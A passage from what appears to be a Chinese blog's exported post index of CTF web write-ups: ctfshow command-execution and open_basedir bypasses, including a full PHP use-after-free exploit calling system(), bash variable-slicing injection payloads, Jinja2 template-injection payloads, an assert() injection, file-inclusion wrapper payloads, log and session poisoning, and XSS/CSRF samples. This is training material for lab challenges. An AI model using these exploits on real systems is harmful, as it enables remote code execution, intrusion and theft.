0; $i < $n; $i++) {\n            $str[$p + $i] = sprintf(\"%c\",($v & 0xff));\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { \n\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { \n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                \n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                \n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) {\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) {\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n\n        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n        $vuln = new Vuln();\n        $vuln->a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; \n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); \n    write($abc, 0xd0 + 0x68, $zif_system); \n\n    ($helper->b)($cmd);\n    exit();\n}\n\nctfshow(\"cat /flag0.txt\");ob_end_flush();\n?>\n\n```\n\n最终\n\n```\npayload:\nPOST\nc=上面的代码\n```\n\n##### 73\n\n同上，文件名更改为flagc\n\n##### 74\n\n```\npayload:\nPOST\nc=include('/flagx.txt');exit();\n```\n\n首先扫目录，同上题payload，而后发现在根目录有flagx.txt尝试包含成功\n\n##### 75\n\nban掉了open_basedir访问文件的方式，只能通过别的方法来访问文件，可以通过mysql访问，在前面几题中可以找到mysql的账号密码，最终payload如下\n\n```PHP\npayload:\nPOST\nc=try {\n  $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');\n  foreach($dbh->query('select load_file(\"/flag36.txt\")') as $row)\n\t{\n    echo($row[0]); \n  }\n  $dbh = null;\n}\ncatch (PDOException $e) \n{\n  echo $e->getMessage();\n  exit(0);\n}\nexit(0);\n```\n\n拓展PDO知识：\n\n```PHP\nPHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。\nPDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。\nPDO随PHP5.1发行，在PHP5.0的PECL扩展中也可以使用，无法运行于之前的PHP版本。\n一个实例\n<?php\n$dbms='mysql';     //数据库类型\n$host='localhost'; //数据库主机名\n$dbName='test';    //使用的数据库\n$user='root';      //数据库连接用户名\n$pass='';          //对应的密码\n$dsn=\"$dbms:host=$host;dbname=$dbName\";\n\ntry {\n    $dbh = new PDO($dsn, $user, $pass); //初始化一个PDO对象\n    echo \"连接成功<br/>\";\n    /*你还可以进行一次搜索操作\n    foreach ($dbh->query('SELECT * from FOO') as $row) {\n        print_r($row); //你可以用 echo($GLOBAL); 来看到这些值\n    }\n    */\n    $dbh = null;\n} catch (PDOException $e) {\n    die (\"Error!: \" . $e->getMessage() . \"<br/>\");\n}\n//默认这个不是长连接，如果需要数据库长连接，需要最后加一个参数：array(PDO::ATTR_PERSISTENT => true) 变成这样：\n$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT => true));\n\n?>\n```\n\n##### 76\n\n同上改名字\n\n##### 77\n\n首先还是扫目录，文件名flag36x.txt，尝试上题方法发现数据库消失，看提示是PHP7.4以上的新特性，可以通过新建一个FFI对象来执行系统命令，又因为执行系统命令后没有回显，所以我们把执行后的结果放到网站目录下的一个文本文件中进行读取\n\n```php\npayload:\nPOST\nc=$ffi = FFI::cdef(\"int system(const char *command);\");\n$a='/readflag > /var/www/html/1.txt';\n$ffi->system($a);\n```\n\n然后访问/1.txt即可\n\n##### 118\n\n首先查看源码，发现输入被包含到system函数中执行，尝试`echo，whoami，ls，cat`全部失效想方法绕过，输入空格发现可以执行，所以可以尝试通过构造系统变量来执行，查看提示的图片\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-21 16.39.03.png)\n\n发现是默认配置文件下的文件名列表，可以通过剪裁构造变量，读取文件命令最容易进行构造的就是`nl`，想拼接出nl只需要取系统配置变量最后一位n和当前执行目录最后一位l即可，最终payload如下\n\n```\npayload:${PATH:~0}${PWD:~0}$IFS????.???\n```\n\n发现还是不行，是因为过滤了数字，没关系，剪裁字符还可通过大写字母解决，真·最终payload如下\n\n```\npayload:${PATH:~A}${PWD:~A}$IFS????.???\n```\n\n**系统变量补充知识**\n\n```\n$PATH 系统配置变量\n$PWD 当前执行目录\n$HOME 默认进入的目录\n$SHELL\n$USER 当前user\n$SHLVL 代表当前shell窗口的深度，一般为1\n$PHP_CFLAGS 指定头文件（.h文件）的路径，如：CFLAGS=-I/usr/include -I/path/include。同样地，安装一个包时会在安装路径下建立一个include目录，当安装过程中出现问题时，试着把以前安装的包的include目录加入到该变量中来。\n$PHP_VERSION PHP版本\n\n```\n\n**Linux变量补充知识**\n\n```\n${变量名:从哪一位开始取:取多长}，如没有长度默认取到最后，如果没有起始位就从头开始\n${#变量名}，代表这个变量的长度\n$\n```\n\n##### 119\n\n先尝试上一把的是否可行，不行所以直接看提示吧，系统变量的知识补充在上一道题了，针对本题\n\n```\nSHLVL的值为2，#SHLVL的值为1，从PHP_VERSION的第二位取一个为3，也就是${PHP_VERSION:${SHLVL}:${#SHLVL}}为3，最终取\nPHP_CFLAGS变量从第三位开始的前三个即可构造tac\n```\n\n最终payload如下\n\n```\npayload:${PHP_CFLAGS:${PHP_VERSION:${SHLVL}:${#SHLVL}}:${PHP_VERSION:${SHLVL}:${#SHLVL}}} ????.???\n```\n\n##### 120\n\n上一把的字符太长了，只能通过别的命令读取了\n\n```\ntips：Linux中的base64在/bin目录之下，base64 文件名即可将文件进行base64编码\n```\n\n所以我们最终构造出结果为/bin/base64 flag.php即可\n\n首先是/字符，PWD首位，而后bin可使用通配符，尝试base64也使用通配符不可行，所以我们尝试构建出数字4来匹配\n\n```\ntips：RANDOM变量能生成一万以内的随机数，用#取长度即可有概率得到4\n```\n\n最终payload\n\n```\npayload:\nPOST\ncode=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???\n```\n\n~~多刷新几次总会出来的~~\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-21 19.36.51.png)\n\n##### 121\n\n尝试上题payload，发现SHLVL被过滤了，所以我们需要一个1\n\n```\ntips:通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误\n```\n\n所以我们使用${#?}即可构造出1，最终payload如下\n\n```\npayload:\nPOST\ncode=AAAAAAAAA\ncode=${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???\n```\n\n##### 122\n\n滤了PWD但是有HOME，HOME替换PWD就行，滤了#号没发去长度，RANDOM取一位即可，随机到了就是胜利\n\n```\npayload:\nPOST\ncode=A;${PWD::${?}}???${PWD::${?}}?????${RANDOM} ????.???\n```\n\n","tags":["CTF","web"]},{"title":"Web_python_template_injection","url":"/2022/02/04/Web-python-template-injection/","content":"\n# Python模版注入\n\n## 漏洞成因\n\n`instance.__class__` 可以获取当前实例的类对象\n\n`class.__mro__` 获取当前类对象的所有继承类\n\n每一个新式类都保留了它所有的子类的引用，`__subclasses__()`这个方法返回了类的所有存活的子类的引用（注意是类对象引用，不是实例）\n\n<!--more-->\n\n在Jinja2模板引擎中，`{{}}`是变量包裹标识符。`{{}}`并不仅仅可以传递变量，还可以执行一些简单的表达式。\n\n所以我们可以任意构造一个变量`xxx.__class__.__mro__[-1].__subclasses__()`来获取该Python程序中所有使用的模块\n\n再使用对应位置的模块通过`__init__`进行初始化，`__globals['变量']__`进行传参进而进行调用\n\n而后我们可以使用python中的os.popen模块执行系统命令\n\n通用payload如下\n\n`{{xxx.__class__.__mro__[-1].__subclasses__()[site._Printer模块对应位置].__init__.__globals__['os'].system('要执行的命令')}}`\n\n`{{xxx.__class__.__mro__[-1].__subclasses__()[flie模块对应位置]('文件名称').read()}}可用于读取文件`\n\n如题目中过滤了关键字，可尝试通过get传参传入参数，如`{{[request.args.a]}}?a=__class__`\n","tags":["-CTF -web -python"]},{"title":"Python于web层应用","url":"/2022/01/25/Python于web层应用/","content":"\n# Python于web层应用\n\n## HTTP协议基础\n\n### 协议分类\n\nHTTP 1.0 80端口 单次一个链接\n\nHTTP 1.1 80端口 多次可一个链接\n\nHTTP协议不够安全，进而发展出了HTTPS协议\n\nHTTPS 443端口 加密后数据传输\n\n<!--more-->\n\n### 请求方法\n\n###### HTTP 1.0\n\nGET POST HEAD\n\n###### HTTP 1.1与HTTPS\n\nOPTIONS PUT DELETE TRACE CONNECT PATCH\n\n### URL格式\n\n协议://主机名.域名/文件夹/文件?参数=值&参数=值\n\n### HTTP请求头\n\nUser-Agent：浏览器版本信息\n\nAccept-encoding：浏览器接受的编码\n\nReferer：当前网页跳转来源\n\nCookie：顾名思义，~~好吃的饼干，~~Cookie信息\n\nLocation：跳转到哪里\n\nSet-Cookie：设置Cookie信息\n\nWWW-Authenticate：用于身份验证HTTP Basic等\n\n### HTTP响应状态码\n\n1XX：信息提示\n\n2XX：成功\n\n3XX：重定向\n\n4XX：客户端错误\n\n5XX：服务端错误\n\n### 查看HTTP\n\n使用浏览器审查进行查看\n\n使用Burpsuite截断查看\n\n## Python使用HTTP请求\n\n###### GET请求\n\n不带参数`requests.get(url)`\n\n带参数`requests.get(url=url,params={\"key1\":\"value1\",\"key2\":\"value2\"})`\n\n返回的对象r.url获取url\n\n###### POST请求\n\n不带参数`requests.post(url)`\n\n带参数`requests.post(url=url,data={\"key1\":\"value1\",\"key2\":\"value2\"})`\n\n###### 自定义请求头\n\nheaders={key1:value1,key2:value2}\n\nrequests.get(url=url,headers=headers)\n\n###### 其他请求\n\nrequests.put(url,data)\n\nrequests.delete(url)\n\nrequests.head(url)\n\nrequests.options(url)\n\n## Python处理HTTP响应\n\n**获取相应状态码：**r.status_code\n\n**获取响应文本：**r.content（获取到二进制内容）r.text（获取原始文本代码）\n\n**获取相应头：**r.headers\n\n**获取请求头：**r.reuqests.headers\n\n**获取请求URL：**r.url\n\n**获取Cookie：**r.cookies\n\n## Python设置HTTP代理\n\n**代理设置：**http和https:`proxies={'http':'http://代理服务器:代理端口','https':'https://代理服务器:代理端口'}`\n\n**参数设置：**`proxies=proxies,verfiy=False`\n\n## Python会话编程\n\n通过Set-Cookie设置一个cookie值\n\n使用`s=requesets.Session()`建立一个新的空会话\n\n`r=s.get(url)`来在会话中发起个体请求\n\n## Python制作目录扫描工具\n\n###### 目录扫描原理\n\n1、读取字典文件拼接URL\n\n2、通过get请求访问URL\n\n3、获取状态码判断目录是否存在\n\n###### 字典文件读取\n\n1、`with open(\"filename.txt\",\"r\") as f:`\n\n2、读取方式：\n\n- `f.readline()//读取一行`\n- `f.readlines()//逐行读取到一个列表中`\n- `f.read(字节数)//按字节读`\n- `line.strip()//去除空行`\n\n3、`f.close()`关闭文件流\n\n4、sys库中的sys.argv[0]为当前python文件绝对路径，sys.argv[1]为传入第一个参数\n\n5、User-Agent通过抓包先获取真实的User-Agent，再通过headers字典传入get请求\n\n## IIS PUT漏洞\n\nIIS中拓展工具WebDAV支持HTTP方法，也提供了一些其他功能强大的方法（Move），使得开启WebDAV可以直接上传任意文件\n\n**探测方法：**通过HTTP中options方法可以探测出服务器支持的HTTP方法\n\n**探测过程：**\n\n- 确定目标主机\n- 使用HTTP options方法探测\n- 查看返回结果中是否存在MOVE PUT\n- 查看响应头中的PUBLIC属性\n\n## 探测服务器信息\n\n相应头中的Server：服务器中间件属性\n\nX-Powered-By：服务器脚本技术\n\n## Python制作漏洞检测工具\n\n首先了解漏洞产生原理，根据漏洞原理写出对应的POC代码来验证漏洞是否存在\n\n## 构建站点地图\n\n测试Web App的首要任务就是获取站点完整的目录和文件\n\n###### 技术种类：建议使用两种方式同时进行\n\n1、通过基于字典的目录文件扫描\n\n2、通过基于网络爬虫的技术（可通过requests库构建，但是很复杂，有scrapy库可用于构建爬虫）\n\n3、通过Burpsuite构建网站地图\n","tags":["web"]},{"title":"post","url":"/2022/01/25/post/"},{"title":"Bugku never_give_up","url":"/2022/01/19/Bugku-never-give-up/","content":"\n# Bugku never_give_up\n\n查看源代码好的提示访问1p.html\n\n```html\n<HTML>\n<HEAD>\n    <SCRIPT LANGUAGE=\"Javascript\">\n    //\n\n\n    var Words = \"%3Cscript%3Ewindow.location.href%3D'http%3A%2F%2Fwww.bugku.com'%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E\"\n    function OutWord()\n    {\n        var NewWords;\n        NewWords = unescape(Words);\n        document.write(NewWords);\n    }\n    OutWord();\n    // -->\n    </script>\n</HEAD>\n<BODY></BODY>\n</HTML>\n\n\n```\n\n<!--more-->\n\n查看函数得知是将`Words`中的内容解码后执行\n\n经过URL解码与base64解码后hello.php的代码如下\n\n```php+HTML\n<script>window.location.href='http://www.bugku.com';</script> \n<!--\";if(!$_GET['id'])\n{\n\theader('Location: hello.php?id=1');\n\texit();\n}\n$id=$_GET['id'];\n$a=$_GET['a'];\n$b=$_GET['b'];\nif(stripos($a,'.'))\n{\n\techo 'no no no no no no no';\n\treturn ;\n}\n$data = @file_get_contents($a,'r');\nif($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)>5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)\n{\n\t$flag = \"flag{***********}\"\n}\nelse\n{\n\tprint \"never never never give up !!!\";\n}\n?>-->\n```\n\n主要判断语句为：\n\n```php\nif($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)>5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)\n```\n\ndata的数据来自file_get_contents函数，可以通过php伪协议中的php://input来伪造\n\nid==0为弱相等，而由于前面判断id所以id不能直接等于0，可以让id=%00，.，0e1，字母字符等绕过\n\nb长度大于5并且首位不为4，并且\"1114\"字符串中存在符合\"111\".substr($b,0,1)该规则的内容\n\n查询正则表达式的特殊字符得知，正则中的特殊字符如下\n\n|      | 特殊字符                                             |\n| ---- | ---------------------------------------------------- |\n| +    | 匹配前面的子表达式一次或多次                         |\n| .    | 匹配除换行符 \\n 之外的任何单字符                     |\n| *    | 匹配前面的子表达式零次或多次                         |\n| ?    | 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符 |\n|      |                                                      |\n\n所以让b字符串开头字符为上述任一字符就行\n\npayload：\n\n```\n?id=a&b=*12345&a=php://input\nbody:\nbugku is a nice plateform!\n```\n\n拿到flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/NGV.png)\n","tags":["CTF","web"]},{"title":"逻辑漏洞","url":"/2022/01/19/逻辑漏洞/","content":"\n# 逻辑漏洞\n\n1、密码找回，任意用户注册\n\n注册时抓包请求头内容，并且在得到返回链接时对比内容，找出编解码方式\n\n<!--more-->\n\n2、支付漏洞\n\n抓包修改付款金额\n\n3、越权\n\n通过直接更改URL中的请求值直接查看或更改他人数据\n\n4、\n","tags":["CTF","web"]},{"title":"攻防世界mfw","url":"/2022/01/19/攻防世界mfw/","content":"\n# 攻防世界mfw\n\n进入网页查看about内容，发现网页使用git进行版本管理\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/mfw1.png)\n\n网站后加.git发现存在git泄漏![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/mfw2.png)\n\n<!--more-->\n\n使用GitHack脚本获得源码\n\n```php\n<?php\n\nif (isset($_GET['page'])) {\n\t$page = $_GET['page'];\n} else {\n\t$page = \"home\";\n}\n\n$file = \"templates/\" . $page . \".php\";\n\n// I heard '..' is dangerous!\nassert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");\n\n// TODO: Make this look nice\nassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");\n\n?>\n<!DOCTYPE html>\n<html>\n\t<head>\n\t\t<meta charset=\"utf-8\">\n\t\t<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n\t\t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n\t\t\n\t\t<title>My PHP Website</title>\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css\" />\n\t</head>\n\t<body>\n\t\t<nav class=\"navbar navbar-inverse navbar-fixed-top\">\n\t\t\t<div class=\"container\">\n\t\t    \t<div class=\"navbar-header\">\n\t\t    \t\t<button type=\"button\" class=\"navbar-toggle collapsed\" data-toggle=\"collapse\" data-target=\"#navbar\" aria-expanded=\"false\" aria-controls=\"navbar\">\n\t\t            \t<span class=\"sr-only\">Toggle navigation</span>\n\t\t            \t<span class=\"icon-bar\"></span>\n\t\t            \t<span class=\"icon-bar\"></span>\n\t\t            \t<span class=\"icon-bar\"></span>\n\t\t          \t</button>\n\t\t          \t<a class=\"navbar-brand\" href=\"#\">Project name</a>\n\t\t        </div>\n\t\t        <div id=\"navbar\" class=\"collapse navbar-collapse\">\n\t\t          \t<ul class=\"nav navbar-nav\">\n\t\t            \t<li <?php if ($page == \"home\") { ?>class=\"active\"<?php } ?>><a href=\"?page=home\">Home</a></li>\n\t\t            \t<li <?php if ($page == \"about\") { ?>class=\"active\"<?php } ?>><a href=\"?page=about\">About</a></li>\n\t\t            \t<li <?php if ($page == \"contact\") { ?>class=\"active\"<?php } ?>><a href=\"?page=contact\">Contact</a></li>\n\t\t\t\t\t\t<!--<li <?php if ($page == \"flag\") { ?>class=\"active\"<?php } ?>><a href=\"?page=flag\">My secrets</a></li> -->\n\t\t          \t</ul>\n\t\t        </div>\n\t\t    </div>\n\t\t</nav>\n\t\t\n\t\t<div class=\"container\" style=\"margin-top: 50px\">\n\t\t\t<?php\n\t\t\t\trequire_once $file;\n\t\t\t?>\n\t\t\t\n\t\t</div>\n\t\t\n\t\t<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js\" />\n\t\t<script src=\"https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js\" />\n\t</body>\n</html>\n\n```\n\nassert()函数将内容当作php命令执行，strpos()函数查找字符串1中字符串2首次出现的位置，尝试通过闭合构造命令\n\n```php\nassert(\"strpos('$file', '..') === false\")\n```\n\n首先使用')闭合strpos函数而后输入.命令拼接字符串，最后加入//注释后面内容\n\n完整payload：\n\n```\n?page=').phpinfo();//\n```\n\n传入后原函数变为\n\n```php\nassert(\"strpos('').phpinfo();//', '..') === false\")\n```\n\n执行成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/mfw3.png)\n\n随后通过system()函数得到flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/mfw4.png)\n","tags":["CTF","web"]},{"title":"文件包含","url":"/2022/01/18/文件包含/","content":"\n# 文件包含\n\n常见的文件包含漏洞函数：include()，require()\n\n### 本地包含\n\n#### 利用方式：\n\n###### 1、php://input：\n\n```\n?file=php://input\n请求体内为PHP代码：<?php phpinfo(); ?>\n```\n\nphp://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input，同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。\n\n遇到file_get_contents()要想到用php://input绕过。\n\n<!--more-->\n\n###### 2、php://filter：\n\n```\n?file=php://filter/rescource=xxx.php\n以base64编码读取\n?file=php://filter/read=convert.base64-encode/resource=xxx.php\n```\n\nphp://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。\n\n###### 3、zip://：\n\n```\n?file=zip://[压缩包绝对路径]#[压缩包内文件]\n```\n\nzip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。\n\n- zip://中只能传入绝对路径。\n- 要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23\n- 只需要是zip的压缩包即可，后缀名可以任意更改。\n- 相同的类型的还有zlib://和bzip2://\n\n###### 4、data://：\n\n```\n?file=data://[<MIME-type>][;cherset=<encoding>][;base64],<data>\n下面为示例\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4=\n```\n\ndata:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。\n\n###### 5、phar//：\n\n```\n?file=phar://压缩包路径（相对绝对都可）/压缩包内文件\n```\n\n需要phar://有点类似zip://同样可以导致任意代码执行。\n\n#### 可供包含的内容：\n\n###### 1、包含Apache日志文件：\n\n###### **条件：对日志文件可读并且知道日志文件的存储目录**\n\n**注意事项：**一般情况下日志存储目录被修改，需要读取服务器配置文件（httpd，conf，nginx，conf...）或者根据phpinfo()中的信息来得知。还有就是日志记录的信息都可以被调整，比如记录报错的等级或者内容格式。\n\nApache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。\n\n如果访问一个不存在的资源时，如http://www.xxxx.com/<?php phpinfo(); ?>,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把<?php phpinfo(); ?> 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。\n\n可以放在User-Agent中\n\n###### 2、包含SESSION\n\n**条件：**找到Session内的可控变量，并且Session文件可读写，并且知道存储路径，PHP中SESSION文件保存路径可以在phpinfo中看到\n\n**常见路径：**\n\n/var/lib/php/sess_PHPSESSID\n/var/lib/php/sess_PHPSESSID\n/tmp/sess_PHPSESSID\n/tmp/sessions/sess_PHPSESSID\nsession文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。\n\n\n###### 3、包含/pros/self/environ\n\n**内容：**proc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。\n\n**条件：**php以cgi方式运行，这样environ才会保持UA头。environ文件存储位置已知，且environ文件可读。\n\n###### 4、包含临时文件\n\nphp中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\Winsdows\\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。\n\n由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。\n\n另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。\n","tags":["CTF","web"]},{"title":"XSS","url":"/2022/01/13/XSS注入/","content":"\n# XSS\n\n#### 内容：\n\n全称为跨站脚本攻击，是一种Web应用程序的漏洞，来自用户的不可信数据在没有验证的情况下被应用程序进行了处理，没有正确转义（escape）或编码（encode）反射回浏览器，导致浏览器引擎执行了非预期代码\n\n#### 类型：\n\n###### 反射性：直接传输代码后，经过后端渲染代码直接放入了前端页面中\n\n###### 存储型：将代码经过后端处理存入数据库，当从数据库查询经前端渲染后代码被执行\n\n###### DOM型：不需要以来服务端相应内容，如果HTML页面中使用了document.location等DOM元素的属性，攻击者就可以利用这些属性注入恶意脚本实施基于DOM的跨站脚本攻击\n\n<!--more-->\n\n#### DOM：\n\nDocument Object Model（文档对象模型），通过HTLM DOM，树中所有节点都可通过JavaScript进行访问，修改，创建，删除\n\n![DOM示意](/images/DOM示意.png)\n\nXSS盲打：\n\n构架script标签使受害者执行，通过document.location和document.cookie获取到受害者的cookie及管理页面等隐私内容导致网站内容泄漏\n\n```html\n<sCRiPt sRC=></sCrIpT>\n```\n\n\n\n#### CSRF：\n\n跨站请求伪造\n\n攻击流程：通过获取受害的Cookie等信息，伪造对应用户的请求头，通过用户身份![CSRF](/images/CSRF.jpg)\n\n使用方法：制作网站时可通过构造img标签直接访问，如\n\n```html\n<img src=\"http://www.myBank.com/Transfer.php?toBankId=1111&money=1000\">\n```\n\n或者通过JavaScript构造post请求并通过dom元素直接提交，如\n\n```html\n<html>\n　　<head>\n　　　　<script type=\"text/javascript\">\n　　　　　　function steal()\n　　　　　　{\n          　　　　 iframe = document.frames[\"steal\"];\n　　     　　      iframe.document.Submit(\"transfer\");\n　　　　　　}\n　　　　</script>\n　　</head>\n\n　　<body onload=\"steal()\">//页面完全载入后触发\n　　　　<iframe name=\"steal\" display=\"none\">\n　　　　　　<form method=\"POST\" 